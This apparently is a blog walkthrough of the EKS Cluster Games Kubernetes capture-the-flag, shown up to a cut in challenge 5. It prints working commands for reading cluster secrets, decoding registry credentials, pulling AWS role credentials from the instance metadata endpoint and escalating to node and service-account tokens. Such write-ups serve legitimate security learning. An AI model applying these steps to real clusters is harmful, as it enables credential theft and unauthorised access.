{"pageProps":{"postData":{"id":["2023","eks_cluster_games_ctf"],"path":"2023/eks_cluster_games_ctf","contentHtml":"<p><a href=\"https://eksclustergames.com\">eksclustergames.com</a> is a new CTF targetted at\nkubernetes vulnerabilities. This is a walk through on how to solve the issues.</p>\n<h1>Challenge 1</h1>\n<p>The first challenge starts off with a clue:</p>\n<pre><code class=\"hljs language-csharp\">Jumpstart your quest <span class=\"hljs-keyword\">by</span> listing all the secrets <span class=\"hljs-keyword\">in</span> the cluster.\nCan you spot the flag among them?\n</code></pre>\n<p>So lets start off by getting the secrets:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get secret\nNAME         TYPE     DATA   AGE\nlog-rotate   Opaque   1      37h\n</code></pre>\n<p>Since there is only one, lets view it!</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get secret -o json\n{\n    <span class=\"hljs-string\">\"apiVersion\"</span>: <span class=\"hljs-string\">\"v1\"</span>,\n    <span class=\"hljs-string\">\"items\"</span>: [\n        {\n            <span class=\"hljs-string\">\"apiVersion\"</span>: <span class=\"hljs-string\">\"v1\"</span>,\n            <span class=\"hljs-string\">\"data\"</span>: {\n                <span class=\"hljs-string\">\"flag\"</span>: <span class=\"hljs-string\">\"d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==\"</span>\n            },\n            <span class=\"hljs-string\">\"kind\"</span>: <span class=\"hljs-string\">\"Secret\"</span>,\n            <span class=\"hljs-string\">\"metadata\"</span>: {\n                <span class=\"hljs-string\">\"creationTimestamp\"</span>: <span class=\"hljs-string\">\"2023-11-01T13:02:08Z\"</span>,\n                <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"log-rotate\"</span>,\n                <span class=\"hljs-string\">\"namespace\"</span>: <span class=\"hljs-string\">\"challenge1\"</span>,\n                <span class=\"hljs-string\">\"resourceVersion\"</span>: <span class=\"hljs-string\">\"890951\"</span>,\n                <span class=\"hljs-string\">\"uid\"</span>: <span class=\"hljs-string\">\"03f6372c-b728-4c5b-ad28-70d5af8d387c\"</span>\n            },\n            <span class=\"hljs-string\">\"type\"</span>: <span class=\"hljs-string\">\"Opaque\"</span>\n        }\n    ],\n    <span class=\"hljs-string\">\"kind\"</span>: <span class=\"hljs-string\">\"List\"</span>,\n    <span class=\"hljs-string\">\"metadata\"</span>: {\n        <span class=\"hljs-string\">\"resourceVersion\"</span>: <span class=\"hljs-string\">\"\"</span>\n    }\n}\n</code></pre>\n<p>The flag seems to be in <code>.items[0].data.flag</code> and is <code>base64</code> encoded so we can\ndecode it as well:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get secret -o json|jq <span class=\"hljs-string\">'.items[0].data.flag'</span> -r | <span class=\"hljs-built_in\">base64</span> -d\nwiz_eks_challenge{omg_over_privileged_*REDACTED*}\n</code></pre>\n<p>First flag found!</p>\n<p>This one was definitely a softball but it gets you nice and warmed up on the\nplatform.</p>\n<h1>Challenge 2</h1>\n<p>The hint for this challenge is:</p>\n<pre><code class=\"hljs language-csharp\">A thing we learned during our research: always check the container registries.\n\nFor your convenience, the crane utility <span class=\"hljs-keyword\">is</span> already pre-installed <span class=\"hljs-keyword\">on</span> the machine.\n</code></pre>\n<p>The first thing I think of when reading this is that it has something to do\nwith the registry a pod is living on.   So lets list the pods and see what is\navailable:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get pod\nNAME                    READY   STATUS    RESTARTS   AGE\ndatabase-pod-2c9b3a4e   1/1     Running   0          36h\n</code></pre>\n<p>With only one pod as a target, lets get the image for it:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get pod -o json |jq <span class=\"hljs-string\">'.items[0].spec.containers[0].image'</span>\n<span class=\"hljs-string\">\"eksclustergames/base_ext_image\"</span>\n</code></pre>\n<p>So its on standard <code>docker.io</code> registry instead of a private one like I was\nexpecting from the clue.   The second hint was that crane is on the system so\nlets use that to pull the image and inspect it:</p>\n<pre><code class=\"hljs language-bash\">❯ crane config eksclustergames/base_ext_image \nError: fetching config: reading image <span class=\"hljs-string\">\"eksclustergames/base_ext_image\"</span>: GET https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest: UNAUTHORIZED: authentication required; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]\n</code></pre>\n<p>Which means this is a private image and we are going to need to get some\ncredentials to an account that has access to this image. Usually you have to\ndefine a secret for kubernetes to be able to pull from private registries and\nsince we started off with a secret test first that is where I'm going to go\nnext:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get pod -o json |jq <span class=\"hljs-string\">'.items[0].spec.imagePullSecrets'</span>\n[\n  {\n    <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"registry-pull-secrets-780bab1d\"</span>\n  }\n]\n</code></pre>\n<p>So that is the secret we need, lets view it:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get secret registry-pull-secrets-780bab1d -o json |jq <span class=\"hljs-string\">'.data.\".dockerconfigjson\"'</span> -r|<span class=\"hljs-built_in\">base64</span> -d|jq\n{\n  <span class=\"hljs-string\">\"auths\"</span>: {\n    <span class=\"hljs-string\">\"index.docker.io/v1/\"</span>: {\n      <span class=\"hljs-string\">\"auth\"</span>: <span class=\"hljs-string\">\"ZWtzY2x1c3RlcmdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZUWo4RnVDbw==\"</span>\n    }\n  }\n}\n</code></pre>\n<p>Looks like we've got some more base64 decoding for the actual auth credentials:</p>\n<pre><code class=\"hljs language-bash\">❯ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"ZWtzY2x1c3RdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZ4RnVDbw==\"</span> | <span class=\"hljs-built_in\">base64</span> -d\neksclustergames:dckr&#x3C;*REDACTED*>\n</code></pre>\n<p>So now we can login with <code>crane auth</code>:</p>\n<pre><code class=\"hljs language-bash\">❯ crane auth login -u eksclustergames -p dckr&#x3C;*REDACTED*> docker.io\n2023/11/03 02:35:49 logged <span class=\"hljs-keyword\">in</span> via /home/user/.docker/config.json\n</code></pre>\n<p>So if we try to view the image again it should work!</p>\n<pre><code class=\"hljs language-bash\">❯ crane config eksclustergames/base_ext_image|jq\n{\n  <span class=\"hljs-string\">\"architecture\"</span>: <span class=\"hljs-string\">\"amd64\"</span>,\n  <span class=\"hljs-string\">\"config\"</span>: {\n    <span class=\"hljs-string\">\"Env\"</span>: [\n      <span class=\"hljs-string\">\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"</span>\n    ],\n    <span class=\"hljs-string\">\"Cmd\"</span>: [\n      <span class=\"hljs-string\">\"/bin/sleep\"</span>,\n      <span class=\"hljs-string\">\"3133337\"</span>\n    ],\n    <span class=\"hljs-string\">\"ArgsEscaped\"</span>: <span class=\"hljs-literal\">true</span>,\n    <span class=\"hljs-string\">\"OnBuild\"</span>: null\n  },\n  <span class=\"hljs-string\">\"created\"</span>: <span class=\"hljs-string\">\"2023-11-01T13:32:18.920734382Z\"</span>,\n  <span class=\"hljs-string\">\"history\"</span>: [\n    {\n      <span class=\"hljs-string\">\"created\"</span>: <span class=\"hljs-string\">\"2023-07-18T23:19:33.538571854Z\"</span>,\n      <span class=\"hljs-string\">\"created_by\"</span>: <span class=\"hljs-string\">\"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / \"</span>\n    },\n    {\n      <span class=\"hljs-string\">\"created\"</span>: <span class=\"hljs-string\">\"2023-07-18T23:19:33.655005962Z\"</span>,\n      <span class=\"hljs-string\">\"created_by\"</span>: <span class=\"hljs-string\">\"/bin/sh -c #(nop)  CMD [\\\"sh\\\"]\"</span>,\n      <span class=\"hljs-string\">\"empty_layer\"</span>: <span class=\"hljs-literal\">true</span>\n    },\n    {\n      <span class=\"hljs-string\">\"created\"</span>: <span class=\"hljs-string\">\"2023-11-01T13:32:18.920734382Z\"</span>,\n      <span class=\"hljs-string\">\"created_by\"</span>: <span class=\"hljs-string\">\"RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}' > /flag.txt # buildkit\"</span>,\n      <span class=\"hljs-string\">\"comment\"</span>: <span class=\"hljs-string\">\"buildkit.dockerfile.v0\"</span>\n    },\n    {\n      <span class=\"hljs-string\">\"created\"</span>: <span class=\"hljs-string\">\"2023-11-01T13:32:18.920734382Z\"</span>,\n      <span class=\"hljs-string\">\"created_by\"</span>: <span class=\"hljs-string\">\"CMD [\\\"/bin/sleep\\\" \\\"3133337\\\"]\"</span>,\n      <span class=\"hljs-string\">\"comment\"</span>: <span class=\"hljs-string\">\"buildkit.dockerfile.v0\"</span>,\n      <span class=\"hljs-string\">\"empty_layer\"</span>: <span class=\"hljs-literal\">true</span>\n    }\n  ],\n  <span class=\"hljs-string\">\"os\"</span>: <span class=\"hljs-string\">\"linux\"</span>,\n  <span class=\"hljs-string\">\"rootfs\"</span>: {\n    <span class=\"hljs-string\">\"type\"</span>: <span class=\"hljs-string\">\"layers\"</span>,\n    <span class=\"hljs-string\">\"diff_ids\"</span>: [\n      <span class=\"hljs-string\">\"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f\"</span>,\n      <span class=\"hljs-string\">\"sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432\"</span>\n    ]\n  }\n}\n</code></pre>\n<p>Looks like they leaked the secret right there in the image layers:</p>\n<pre><code class=\"hljs language-vbnet\">wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}<span class=\"hljs-comment\">'</span>\n</code></pre>\n<p>So lets submit that and move onto the next one!</p>\n<h1>Challenge 3</h1>\n<p>The hint is:</p>\n<pre><code class=\"hljs language-vbnet\">A pod<span class=\"hljs-comment\">'s image holds more than just code. Dive deep into its ECR repository,</span>\ninspect the image layers, <span class=\"hljs-built_in\">and</span> uncover the hidden secret.\n\n<span class=\"hljs-symbol\">Remember:</span> You are running inside a compromised EKS pod.\n</code></pre>\n<p>This sounds very similar to the last one but with the hints that its on ECR and\nthat we are in the pod itself it makes me believe we'll have something like IRSA\naccess to AWS from the pod and need to use that to get to it.</p>\n<p>First lets check what pods we are working with:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get pod\nNAME                      READY   STATUS    RESTARTS   AGE\naccounting-pod-876647f8   1/1     Running   0          37h\n</code></pre>\n<p>So same as the last challenge, lets get the image and see what access we have:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get pod -o json |jq <span class=\"hljs-string\">'.items[0].spec.containers[0].image'</span>\n<span class=\"hljs-string\">\"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\"</span>\n</code></pre>\n<p>Which as expected, we do not have access to:</p>\n<pre><code class=\"hljs language-bash\">❯ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\nError: fetching config: reading image <span class=\"hljs-string\">\"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\"</span>: GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01: unexpected status code 401 Unauthorized: Not Authorized\n</code></pre>\n<p>Since I expect the pod already has AWS access, lets check if the AWS CLI works:</p>\n<pre><code class=\"hljs language-bash\">❯ aws sts get-caller-identity\n\nUnable to locate credentials. You can configure credentials by running <span class=\"hljs-string\">\"aws configure\"</span>.\n</code></pre>\n<p>Credentials are not configured right now, so we need to discover them.  Lets\ncheck if we have metadata server access:</p>\n<pre><code class=\"hljs language-bash\">❯ curl http://169.254.169.254/latest/meta-data/iam\ninfo\nsecurity-credentials/\n</code></pre>\n<p>We do!  So we should be able to pull the credentials out of there to get access\nto AWS:</p>\n<pre><code class=\"hljs language-bash\">❯ curl -sS http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole|jq\n{\n  <span class=\"hljs-string\">\"AccessKeyId\"</span>: <span class=\"hljs-string\">\"ASIA2AVYNE&#x3C;*REDACTED*>\"</span>,\n  <span class=\"hljs-string\">\"Expiration\"</span>: <span class=\"hljs-string\">\"2023-11-03 03:50:19+00:00\"</span>,\n  <span class=\"hljs-string\">\"SecretAccessKey\"</span>: <span class=\"hljs-string\">\"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*\"</span>,\n  <span class=\"hljs-string\">\"SessionToken\"</span>: <span class=\"hljs-string\">\"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>\"</span>\n}\n</code></pre>\n<p>Lets set those as environment variables to activate our AWS access:</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">export</span> AWS_ACCESS_KEY_ID=<span class=\"hljs-string\">\"ASIA2AVYNE&#x3C;*REDACTED*\"</span>\n<span class=\"hljs-built_in\">export</span> AWS_SECRET_ACCESS_KEY=<span class=\"hljs-string\">\"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*\"</span>\n<span class=\"hljs-built_in\">export</span> AWS_SESSION_TOKEN=<span class=\"hljs-string\">\"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>\"</span>\n\n❯ aws sts get-caller-identity\n{\n    <span class=\"hljs-string\">\"UserId\"</span>: <span class=\"hljs-string\">\"ASIA2AVYNE&#x3C;*REDACTED*>:i-0cb922c6673973282\"</span>,\n    <span class=\"hljs-string\">\"Account\"</span>: <span class=\"hljs-string\">\"688655246681\"</span>,\n    <span class=\"hljs-string\">\"Arn\"</span>: <span class=\"hljs-string\">\"arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282\"</span>\n}\n</code></pre>\n<p>Now we should be able to authenticate crane and inspect the image from ECR:</p>\n<pre><code class=\"hljs language-bash\">❯ <span class=\"hljs-built_in\">export</span> PASSWORD=$(aws ecr get-login-password)\n❯ crane auth login -u AWS -p <span class=\"hljs-variable\">$PASSWORD</span> 688655246681.dkr.ecr.us-west-1.amazonaws.com  \n2023/11/03 02:56:41 logged <span class=\"hljs-keyword\">in</span> via /home/user/.docker/config.json\n</code></pre>\n<p>Lets get those layers!</p>\n<pre><code class=\"hljs language-bash\">❯ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01|jq\n{\n  <span class=\"hljs-string\">\"architecture\"</span>: <span class=\"hljs-string\">\"amd64\"</span>,\n  <span class=\"hljs-string\">\"config\"</span>: {\n    <span class=\"hljs-string\">\"Env\"</span>: [\n      <span class=\"hljs-string\">\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"</span>\n    ],\n    <span class=\"hljs-string\">\"Cmd\"</span>: [\n      <span class=\"hljs-string\">\"/bin/sleep\"</span>,\n      <span class=\"hljs-string\">\"3133337\"</span>\n    ],\n    <span class=\"hljs-string\">\"ArgsEscaped\"</span>: <span class=\"hljs-literal\">true</span>,\n    <span class=\"hljs-string\">\"OnBuild\"</span>: null\n  },\n  <span class=\"hljs-string\">\"created\"</span>: <span class=\"hljs-string\">\"2023-11-01T13:32:07.782534085Z\"</span>,\n  <span class=\"hljs-string\">\"history\"</span>: [\n    {\n      <span class=\"hljs-string\">\"created\"</span>: <span class=\"hljs-string\">\"2023-07-18T23:19:33.538571854Z\"</span>,\n      <span class=\"hljs-string\">\"created_by\"</span>: <span class=\"hljs-string\">\"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / \"</span>\n    },\n    {\n      <span class=\"hljs-string\">\"created\"</span>: <span class=\"hljs-string\">\"2023-07-18T23:19:33.655005962Z\"</span>,\n      <span class=\"hljs-string\">\"created_by\"</span>: <span class=\"hljs-string\">\"/bin/sh -c #(nop)  CMD [\\\"sh\\\"]\"</span>,\n      <span class=\"hljs-string\">\"empty_layer\"</span>: <span class=\"hljs-literal\">true</span>\n    },\n    {\n      <span class=\"hljs-string\">\"created\"</span>: <span class=\"hljs-string\">\"2023-11-01T13:32:07.782534085Z\"</span>,\n      <span class=\"hljs-string\">\"created_by\"</span>: <span class=\"hljs-string\">\"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal&#x3C;*REDACTED*>} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit\"</span>,\n      <span class=\"hljs-string\">\"comment\"</span>: <span class=\"hljs-string\">\"buildkit.dockerfile.v0\"</span>\n    },\n    {\n      <span class=\"hljs-string\">\"created\"</span>: <span class=\"hljs-string\">\"2023-11-01T13:32:07.782534085Z\"</span>,\n      <span class=\"hljs-string\">\"created_by\"</span>: <span class=\"hljs-string\">\"CMD [\\\"/bin/sleep\\\" \\\"3133337\\\"]\"</span>,\n      <span class=\"hljs-string\">\"comment\"</span>: <span class=\"hljs-string\">\"buildkit.dockerfile.v0\"</span>,\n      <span class=\"hljs-string\">\"empty_layer\"</span>: <span class=\"hljs-literal\">true</span>\n    }\n  ],\n  <span class=\"hljs-string\">\"os\"</span>: <span class=\"hljs-string\">\"linux\"</span>,\n  <span class=\"hljs-string\">\"rootfs\"</span>: {\n    <span class=\"hljs-string\">\"type\"</span>: <span class=\"hljs-string\">\"layers\"</span>,\n    <span class=\"hljs-string\">\"diff_ids\"</span>: [\n      <span class=\"hljs-string\">\"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f\"</span>,\n      <span class=\"hljs-string\">\"sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5\"</span>\n    ]\n  }\n}\n</code></pre>\n<p>Looks like they made the same mistake again and leaked the secret in the image\nlayers!</p>\n<pre><code class=\"hljs language-markdown\">wiz<span class=\"hljs-emphasis\">_eks_</span>challenge{the<span class=\"hljs-emphasis\">_history_</span>of<span class=\"hljs-emphasis\">_container_</span>images<span class=\"hljs-emphasis\">_could_</span>reveal&#x3C;<span class=\"hljs-emphasis\">*REDACTED*</span>>} \n</code></pre>\n<p>Time for challenge 4!</p>\n<h1>Challenge 4</h1>\n<p>The hint:</p>\n<pre><code class=\"hljs language-python\">Yo<span class=\"hljs-string\">u're inside a vulnerable pod on an EKS cluster. Your pod'</span>s service-account has\nno permissions. Can you navigate your way to access the EKS Node<span class=\"hljs-string\">'s privileged\nservice-account?\n</span></code></pre>\n<p>This sounds like we're going to need to escalate our privileges through the AWS\naccess we acquired in the last challenge. Lets start with inspecting the\nenvironment again:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get pod\nError from server (Forbidden): pods is forbidden: User <span class=\"hljs-string\">\"system:serviceaccount:challenge4:service-account-challenge4\"</span> cannot list resource <span class=\"hljs-string\">\"pods\"</span> <span class=\"hljs-keyword\">in</span> API group <span class=\"hljs-string\">\"\"</span> <span class=\"hljs-keyword\">in</span> the namespace <span class=\"hljs-string\">\"challenge4\"</span>\n</code></pre>\n<p>So we don't even have access to list pods!   Do we have any access?</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl auth can-i --list\nwarning: the list may be incomplete: webhook authorizer does not support user rule resolution\nResources                                       Non-Resource URLs                     Resource Names     Verbs\nselfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]\nselfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]\n                                                [/.well-known/openid-configuration]   []                 [get]\n                                                [/api/*]                              []                 [get]\n                                                [/api]                                []                 [get]\n                                                [/apis/*]                             []                 [get]\n                                                [/apis]                               []                 [get]\n                                                [/healthz]                            []                 [get]\n                                                [/healthz]                            []                 [get]\n                                                [/livez]                              []                 [get]\n                                                [/livez]                              []                 [get]\n                                                [/openapi/*]                          []                 [get]\n                                                [/openapi]                            []                 [get]\n                                                [/openid/v1/jwks]                     []                 [get]\n                                                [/readyz]                             []                 [get]\n                                                [/readyz]                             []                 [get]\n                                                [/version/]                           []                 [get]\n                                                [/version/]                           []                 [get]\n                                                [/version]                            []                 [get]\n                                                [/version]                            []                 [get]\npodsecuritypolicies.policy                      []                                    [eks.privileged]   [use]\n</code></pre>\n<p>That is <em>very</em> minimal access. So we are going to have to try get a token using\nthe escalated privileges.  Usually we could use <code>aws eks get-token</code> but that\nrequires knowing the cluster name and I don't know that.   Lets try to list the\nclusters:</p>\n<pre><code class=\"hljs language-bash\">❯ aws eks list-clusters\n\nAn error occurred (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/*\n</code></pre>\n<p>So they haven't given us much to go on at all here.  The role itself <em>might</em> be\na clue but that is relying on them being consistent with their naming:</p>\n<pre><code class=\"hljs language-ruby\"><span class=\"hljs-symbol\">arn:</span><span class=\"hljs-symbol\">aws:</span>sts::<span class=\"hljs-number\">688655246681</span><span class=\"hljs-symbol\">:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/</span>\n</code></pre>\n<p>The cluster name <em>might</em> be <code>eks-challenge-cluster</code> based on that but I can't\nguarantee that. Lets check its security groups:</p>\n<pre><code class=\"hljs language-bash\">❯ curl -sS http://169.254.169.254/latest/meta-data/security-groups;<span class=\"hljs-built_in\">echo</span>\neks-cluster-sg-eks-challenge-cluster-963543728\n</code></pre>\n<p>The name is there again.  I don't feel good about not having more details but it\nis at least worth trying it:</p>\n<pre><code class=\"hljs language-bash\">❯ aws eks get-token --cluster-name eks-challenge-cluster\n{\n    <span class=\"hljs-string\">\"kind\"</span>: <span class=\"hljs-string\">\"ExecCredential\"</span>,\n    <span class=\"hljs-string\">\"apiVersion\"</span>: <span class=\"hljs-string\">\"client.authentication.k8s.io/v1beta1\"</span>,\n    <span class=\"hljs-string\">\"spec\"</span>: {},\n    <span class=\"hljs-string\">\"status\"</span>: {\n        <span class=\"hljs-string\">\"expirationTimestamp\"</span>: <span class=\"hljs-string\">\"2023-11-03T03:38:10Z\"</span>,\n        <span class=\"hljs-string\">\"token\"</span>: <span class=\"hljs-string\">\"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYX&#x3C;*REDACTED*\"</span>\n    }\n}\n</code></pre>\n<p>This gets us a token, so lets try to use it:</p>\n<pre><code class=\"hljs language-bash\">❯ <span class=\"hljs-built_in\">export</span> TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster|jq <span class=\"hljs-string\">'.status.token'</span> -r)\n❯ kubectl --token <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$TOKEN</span>\"</span> auth can-i --list\nwarning: the list may be incomplete: webhook authorizer does not support user rule resolution\nResources                                       Non-Resource URLs   Resource Names     Verbs\nserviceaccounts/token                           []                  [debug-sa]         [create]\nselfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]\nselfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]\npods                                            []                  []                 [get list]\nsecrets                                         []                  []                 [get list]\nserviceaccounts                                 []                  []                 [get list]\n                                                [/api/*]            []                 [get]\n                                                [/api]              []                 [get]\n                                                [/apis/*]           []                 [get]\n                                                [/apis]             []                 [get]\n                                                [/healthz]          []                 [get]\n                                                [/healthz]          []                 [get]\n                                                [/livez]            []                 [get]\n                                                [/livez]            []                 [get]\n                                                [/openapi/*]        []                 [get]\n                                                [/openapi]          []                 [get]\n                                                [/readyz]           []                 [get]\n                                                [/readyz]           []                 [get]\n                                                [/version/]         []                 [get]\n                                                [/version/]         []                 [get]\n                                                [/version]          []                 [get]\n                                                [/version]          []                 [get]\npodsecuritypolicies.policy                      []                  [eks.privileged]   [use]\n</code></pre>\n<p>Perfect!  We have more access which includes fetching secrets:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl --token <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$TOKEN</span>\"</span> get secret -o json\n{\n    <span class=\"hljs-string\">\"apiVersion\"</span>: <span class=\"hljs-string\">\"v1\"</span>,\n    <span class=\"hljs-string\">\"items\"</span>: [\n        {\n            <span class=\"hljs-string\">\"apiVersion\"</span>: <span class=\"hljs-string\">\"v1\"</span>,\n            <span class=\"hljs-string\">\"data\"</span>: {\n                <span class=\"hljs-string\">\"flag\"</span>: <span class=\"hljs-string\">\"d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3&#x3C;*REDACTED*>=\"</span>\n            },\n            <span class=\"hljs-string\">\"kind\"</span>: <span class=\"hljs-string\">\"Secret\"</span>,\n            <span class=\"hljs-string\">\"metadata\"</span>: {\n                <span class=\"hljs-string\">\"creationTimestamp\"</span>: <span class=\"hljs-string\">\"2023-11-01T12:27:57Z\"</span>,\n                <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"node-flag\"</span>,\n                <span class=\"hljs-string\">\"namespace\"</span>: <span class=\"hljs-string\">\"challenge4\"</span>,\n                <span class=\"hljs-string\">\"resourceVersion\"</span>: <span class=\"hljs-string\">\"883574\"</span>,\n                <span class=\"hljs-string\">\"uid\"</span>: <span class=\"hljs-string\">\"26461a29-ec72-40e1-adc7-99128ce664f7\"</span>\n            },\n            <span class=\"hljs-string\">\"type\"</span>: <span class=\"hljs-string\">\"Opaque\"</span>\n        }\n    ],\n    <span class=\"hljs-string\">\"kind\"</span>: <span class=\"hljs-string\">\"List\"</span>,\n    <span class=\"hljs-string\">\"metadata\"</span>: {\n        <span class=\"hljs-string\">\"resourceVersion\"</span>: <span class=\"hljs-string\">\"\"</span>\n    }\n}\n</code></pre>\n<p>So we just need to base64 decode that and we are on to the next challenge!</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl --token <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$TOKEN</span>\"</span> get secret -o json | jq <span class=\"hljs-string\">'.items[0].data.flag'</span> -r|<span class=\"hljs-built_in\">base64</span> -d\nwiz_eks_challenge{only_a_real_pro_can_navigate_&#x3C;*REDACTED*>}\n</code></pre>\n<h1>Challenge 5</h1>\n<p>The hint:</p>\n<pre><code class=\"hljs language-vbnet\">You<span class=\"hljs-comment\">'ve successfully transitioned from a limited Service Account to a Node</span>\nService Account! Great job. Your <span class=\"hljs-keyword\">next</span> challenge <span class=\"hljs-built_in\">is</span> <span class=\"hljs-keyword\">to</span> move <span class=\"hljs-keyword\">from</span> the EKS <span class=\"hljs-keyword\">to</span> the\nAWS account.\n\nCan you acquire the AWS role <span class=\"hljs-keyword\">of</span> the s3access-sa service account, <span class=\"hljs-built_in\">and</span> <span class=\"hljs-keyword\">get</span> the flag?\n</code></pre>\n<p>So lets start with checking what access we do have:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl <span class=\"hljs-built_in\">whoami</span>\nsystem:node:challenge:ip-192-168-21-50.us-west-1.compute.internal\n</code></pre>\n<p>Can we list buckets?</p>\n<pre><code class=\"hljs language-bash\">❯ aws s3 <span class=\"hljs-built_in\">ls</span>\n\nAn error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied\n</code></pre>\n<p>Nope!  So we need to figure out how to become the <code>s3access-sa</code>. What access do\nwe have?</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl auth can-i --list\nwarning: the list may be incomplete: webhook authorizer does not support user rule resolution\nResources                                       Non-Resource URLs   Resource Names     Verbs\nserviceaccounts/token                           []                  [debug-sa]         [create]\nselfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]\nselfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]\npods                                            []                  []                 [get list]\nsecrets                                         []                  []                 [get list]\nserviceaccounts                                 []                  []                 [get list]\n                                                [/api/*]            []                 [get]\n                                                [/api]              []                 [get]\n                                                [/apis/*]           []                 [get]\n                                                [/apis]             []                 [get]\n                                                [/healthz]          []                 [get]\n                                                [/healthz]          []                 [get]\n                                                [/livez]            []                 [get]\n                                                [/livez]            []                 [get]\n                                                [/openapi/*]        []                 [get]\n                                                [/openapi]          []                 [get]\n                                                [/readyz]           []                 [get]\n                                                [/readyz]           []                 [get]\n                                                [/version/]         []                 [get]\n                                                [/version/]         []                 [get]\n                                                [/version]          []                 [get]\n                                                [/version]          []                 [get]\npodsecuritypolicies.policy                      []                  [eks.privileged]   [use]\n</code></pre>\n<p>Hmm, being able to create tokens for the <code>debug-sa</code> resource definitely seems\nsuspicious. So lets see if that will get us anywhere:</p>\n<pre><code class=\"hljs language-bash\">❯ <span class=\"hljs-built_in\">export</span> TOKEN=$(kubectl create token debug-sa)\n❯ kubectl --token <span class=\"hljs-variable\">$TOKEN</span> auth can-i --list\nwarning: the list may be incomplete: webhook authorizer does not support user rule resolution\nResources                                       Non-Resource URLs                     Resource Names     Verbs\nselfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]\nselfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]\n                                                [/.well-known/openid-configuration]   []                 